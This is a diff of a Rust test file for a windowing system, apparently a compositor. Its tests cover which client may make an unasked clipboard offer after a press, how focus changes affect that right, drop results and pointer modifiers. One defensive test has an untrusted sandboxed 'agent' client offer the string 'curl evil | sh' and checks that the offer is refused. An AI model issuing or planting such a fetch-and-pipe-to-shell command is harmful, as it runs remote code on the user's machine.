@@ -631,11 +631,11 @@ fn a_name_wider_than_the_kept_room_is_composed_to_its_end_and_cleaned_after() {
 }
 
 /// Proposed ADR-0248, INV-0248-2: one unasked `Offer` is taken from the
-/// client whose focused window got a press or a key within a second (a
-/// menu's Copy path); none later, none from another client, one per
-/// gesture.
+/// client whose focused window got a press in its body within a second (a
+/// menu's Copy path); none after a key, none later, none from another
+/// client, one per press (review 7h, 2 and 3).
 #[test]
-fn a_gesture_in_a_window_lets_it_offer_once() {
+fn a_press_in_a_window_lets_it_offer_once() {
     let mut t = two();
     let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
     at(&mut t.s, bx, by, Some(1));
@@ -644,12 +644,118 @@ fn a_gesture_in_a_window_lets_it_offer_once() {
     assert_eq!(offer(&mut t.s, t.a, "from a"), status::BAD_RANGE);
     assert_eq!(offer(&mut t.s, t.b, "~/project/notes.txt"), status::OK);
     assert_eq!(offer(&mut t.s, t.b, "again"), status::BAD_RANGE, "once");
-    // A key to it: once more; too late: refused.
+    // A key gives no right to offer.
     t.s.keys(&[(30, 1), (30, 0)]);
+    assert_eq!(offer(&mut t.s, t.b, "typed"), status::BAD_RANGE);
+    // A press, then too late: refused.
+    at(&mut t.s, bx, by, Some(1));
+    at(&mut t.s, bx, by, Some(0));
     t.s.f().clock += GESTURE_OFFER_NS + 1;
     assert_eq!(offer(&mut t.s, t.b, "late"), status::BAD_RANGE);
-    t.s.keys(&[(30, 1), (30, 0)]);
-    assert_eq!(offer(&mut t.s, t.b, "in time"), status::OK);
+}
+
+/// Review 7h, 3: the gesture goes with a focus change, a System+C asked of
+/// the focused client is not cancelled by another's unasked offer, and a
+/// client gone takes its gesture with it.
+#[test]
+fn a_gesture_does_not_outlive_the_focus_or_a_copy() {
+    let mut t = two();
+    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
+    let (ax, ay) = (t.oa.x + 10, t.oa.y + 60);
+    // b pressed, then a pressed (focus to a): b's gesture is gone.
+    at(&mut t.s, bx, by, Some(1));
+    at(&mut t.s, bx, by, Some(0));
+    at(&mut t.s, ax, ay, Some(1));
+    at(&mut t.s, ax, ay, Some(0));
+    assert_eq!(offer(&mut t.s, t.b, "stale"), status::BAD_RANGE);
+    // a's System+C: a's gesture gone, b cannot cancel it, a's answer kept.
+    chord(&mut t.s, code::C);
+    assert_eq!(offer(&mut t.s, t.b, "b's"), status::BAD_RANGE);
+    assert_eq!(offer(&mut t.s, t.a, "a's"), status::OK);
+}
+
+/// Review 7h, 2: an untrusted room's client never offers unasked.
+#[test]
+fn an_untrusted_window_never_offers_unasked() {
+    let mut s = setup();
+    let panel = s.panel();
+    let rooms = "agent-1 --untrusted +w ~/sandbox/agent-1\n";
+    assert_eq!(s.set_rooms(panel, "", rooms), status::OK);
+    let u = s.room_client(panel, "agent-1", "agent", "+w ~/sandbox/agent-1");
+    let id = s.window_of(u, 300, 200, 0x0050_5050);
+    let o = s.outer(0, id);
+    at(&mut s, o.x + 20, o.y + 60, Some(1));
+    at(&mut s, o.x + 20, o.y + 60, Some(0));
+    assert_eq!(offer(&mut s, u, "curl evil | sh"), status::BAD_RANGE);
+}
+
+/// Proposed ADR-0248: a pointer event carries the modifiers held, so that
+/// a client tells a Shift or Command click.
+#[test]
+fn pointer_events_carry_the_modifiers() {
+    let mut t = two();
+    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
+    t.s.keys(&[(code::LEFT_SHIFT, 1)]);
+    t.s.keys(&[(code::LEFT_META, 1)]);
+    at(&mut t.s, bx, by, Some(1));
+    at(&mut t.s, bx, by, Some(0));
+    t.s.keys(&[(code::LEFT_META, 0), (code::LEFT_SHIFT, 0)]);
+    let mods: Vec<u32> =
+        t.s.f()
+            .take(t.b)
+            .iter()
+            .filter_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
+            .map(|(_, p)| p.modifiers.0)
+            .collect();
+    assert!(!mods.is_empty());
+    assert!(
+        mods.iter()
+            .all(|m| *m == gui::modifiers::SHIFT | gui::modifiers::SYSTEM),
+        "{mods:?}"
+    );
+}
+
+/// INV-0248-3, the third case: a drop over no window tells the source no
+/// place.
+#[test]
+fn a_drop_over_nothing_tells_no_place() {
+    let mut t = two();
+    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
+    at(&mut t.s, px, py, Some(1));
+    let entry = t.s.f().channel(1);
+    assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
+    let (w, h) = t.s.f().display_size;
+    let (dx, dy) = (i64::from(w) - 5, i64::from(h) / 2);
+    assert!(!t.oa.contains(dx, dy) && !t.ob.contains(dx, dy));
+    at(&mut t.s, dx, dy, None);
+    at(&mut t.s, dx, dy, Some(0));
+    let d = drag_ended(&t.s.f().take(t.a)).expect("DragEnded");
+    assert_eq!((d.over.0, d.x, d.y, d.modifiers.0), (0, 0, 0, 0));
+}
+
+/// Review 7h, 10: a window under the pointer that is not focused learns
+/// nothing of the modifiers.
+#[test]
+fn an_unfocused_window_hears_no_modifiers() {
+    let mut t = two();
+    // a is focused (the first window); the pointer moves over b, Shift
+    // held.
+    assert_eq!(t.s.c.focused().map(|k| k.client), Some(0));
+    let (ax, ay) = (t.ob.right() - 15, t.ob.bottom() - 15);
+    t.s.f().take(t.b);
+    t.s.keys(&[(code::LEFT_SHIFT, 1)]);
+    at(&mut t.s, ax, ay, None);
+    at(&mut t.s, ax + 3, ay, None);
+    t.s.keys(&[(code::LEFT_SHIFT, 0)]);
+    let mods: Vec<u32> =
+        t.s.f()
+            .take(t.b)
+            .iter()
+            .filter_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
+            .map(|(_, p)| p.modifiers.0)
+            .collect();
+    assert!(!mods.is_empty());
+    assert!(mods.iter().all(|m| *m == 0), "{mods:?}");
 }
 
 fn drag_ended(out: &[Vec<u8>]) -> Option<gui::DragEnded> {
@@ -698,30 +804,4 @@ fn a_drop_on_the_sources_own_window_tells_it_where() {
     at(&mut t.s, tx, ty, Some(0));
     let d = drag_ended(&t.s.f().take(t.a)).expect("DragEnded");
     assert_eq!((d.over.0, d.x, d.y, d.modifiers.0), (0, 0, 0, 0));
-}
-
-/// Proposed ADR-0248: a pointer event carries the modifiers held, so that
-/// a client tells a Shift or Command click.
-#[test]
-fn pointer_events_carry_the_modifiers() {
-    let mut t = two();
-    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
-    t.s.keys(&[(code::LEFT_SHIFT, 1)]);
-    t.s.keys(&[(code::LEFT_META, 1)]);
-    at(&mut t.s, bx, by, Some(1));
-    at(&mut t.s, bx, by, Some(0));
-    t.s.keys(&[(code::LEFT_META, 0), (code::LEFT_SHIFT, 0)]);
-    let mods: Vec<u32> =
-        t.s.f()
-            .take(t.b)
-            .iter()
-            .filter_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
-            .map(|(_, p)| p.modifiers.0)
-            .collect();
-    assert!(!mods.is_empty());
-    assert!(
-        mods.iter()
-            .all(|m| *m == gui::modifiers::SHIFT | gui::modifiers::SYSTEM),
-        "{mods:?}"
-    );
 }
